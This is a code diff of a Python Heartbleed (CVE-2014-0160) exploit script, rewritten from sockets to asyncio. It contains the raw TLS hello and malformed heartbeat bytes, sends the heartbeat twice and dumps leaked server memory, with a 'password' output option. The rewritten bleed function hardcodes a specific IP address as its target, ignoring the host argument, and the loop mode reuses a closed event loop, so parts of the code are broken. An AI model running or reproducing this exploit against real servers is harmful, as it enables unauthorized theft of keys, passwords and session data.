@@ -6,19 +6,16 @@
 # @Reference Jared Stafford (jspenguin@jspenguin.org)
 #
 
+import asyncio
+import binascii
 import struct
-import socket
-import time
-import codecs
 import logging
 from optparse import OptionParser
 
-decode_hex = codecs.getdecoder('hex_codec')
-def h2bin(x):
-	return decode_hex(x.replace(' ', '').replace('\n', '').replace('\t', ''))[0]
+def unhexlify(x):
+	return binascii.unhexlify(x.replace(' ', '').replace('\n', '').replace('\t', ''))
 
-# binary data, copy from web
-hello = h2bin('''
+hello = unhexlify('''
 	16 03 02 00  dc 01 00 00 d8 03 02 53
 	43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
 	bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
@@ -36,7 +33,7 @@ hello = h2bin('''
 	00 0f 00 01 01                                  
 ''')
 
-hb = h2bin(''' 
+hb = unhexlify('''
 	18 03 02 00 03
 	01 40 00
 ''')
@@ -75,66 +72,62 @@ def recvAll(s, length, timeout=5):
 
 	return rdata
 
-def recvMessage(s):
-	hdr = recvAll(s, 5)
-	if hdr is None:
+@asyncio.coroutine
+def recvMessage(reader):
+	header = yield from reader.read(5)
+	if header is None:
 		logging.warning('Unexpected EOF receiving record header - server closed connection')
 		return None, None, None
-	typ, ver, ln = struct.unpack('>BHH', hdr)
-	pay = recvAll(s, ln, 10)
-	if pay is None:
+
+	typ, ver, length = struct.unpack('!BHH', header)
+
+	payload = yield from reader.read(length)
+	if payload is None:
 		logging.warning('Unexpected EOF receiving record payload - server closed connection')
 		return None, None, None
-	logging.info(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
-	return typ, ver, pay
 
-def hitHeartbleed(s):
-	s.send(hb)
-	while True:
-		typ, ver, pay = recvMessage(s)
+	logging.info(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(payload)))
+	return typ, ver, payload
 
-		if typ is None:
-			logging.error('No heartbeat response received, server likely not vulnerable')
-			return False
-
-		if typ == 24:
-			logging.info('Received heartbeat response:')
-			dump(pay)
-			if len(pay) > 3:
-				logging.warning('Server returned more data than it should - server is vulnerable!')
-			else:
-				logging.warning('Server processed malformed heartbeat, but did not return any extra data.')
-			return True
-
-		if typ == 21:
-			logging.warning('Received alert:')
-			dump(pay)
-			logging.error('Server returned error, likely not vulnerable')
-			return False
-
-def bleed(host, port):
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-	logging.info('Connecting...')
-	s.connect((host, port))
-
-	logging.info('Sending Client Hello...')
-	s.send(hello)
-
-	logging.info('Waiting for Server Hello...')
+@asyncio.coroutine
+def bleed(loop):
+	reader, writer = yield from asyncio.open_connection('218.244.141.205', 443, loop=loop)
+	writer.write(hello)
 
 	while True:
-		typ, ver, pay = recvMessage(s)
+		typ, ver, payload = yield from recvMessage(reader)
+
 		if typ == None:
 			logging.error('Server closed connection without sending Server Hello.')
 			return
+
 		# Look for server hello done message.
-		if typ == 22 and pay[0] == 0x0E:
+		if typ == 22 and payload[0] == 0x0E:
 			break
 
 	logging.info('Sending heartbeat request...')
-	s.send(hb)
-	hitHeartbleed(s)
+	writer.write(hb)
+	writer.write(hb)
+
+	typ, ver, payload = yield from recvMessage(reader)
+
+	if typ is None:
+		logging.error('No heartbeat response received, server likely not vulnerable')
+
+	elif typ == 24:
+		logging.info('Received heartbeat response:')
+		dump(payload)
+		if len(payload) > 3:
+			logging.warning('Server returned more data than it should - server is vulnerable!')
+		else:
+			logging.warning('Server processed malformed heartbeat, but did not return any extra data.')
+
+	elif typ == 21:
+		logging.warning('Received alert:')
+		dump(payload)
+		logging.error('Server returned error, likely not vulnerable')
+	else:
+		logging.error('Unknown response type')
 
 if __name__ == '__main__':
 	optionParser = OptionParser(usage='%prog server [option]', description='Demo of heartbleed(CVE-2014-0160)')
@@ -142,7 +135,7 @@ if __name__ == '__main__':
 	optionParser.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex] (default: text)')
 	optionParser.add_option('-l', '--loop', action='store_true', default=False, help='Whether loop forever')
 
-	option, arg = optionParser.parse_arg()
+	option, arg = optionParser.parse_args()
 	if len(arg) < 1:
 		optionParser.print_help()
 	else:
@@ -158,6 +151,10 @@ if __name__ == '__main__':
 
 		if option.loop:
 			while True:
-				bleed(arg[0], option.port)
+				loop = asyncio.get_event_loop()
+				loop.run_until_complete(bleed(loop))
+				loop.close()
 		else:
-			bleed(arg[0], option.port)
+			loop = asyncio.get_event_loop()
+			loop.run_until_complete(bleed(loop))
+			loop.close()
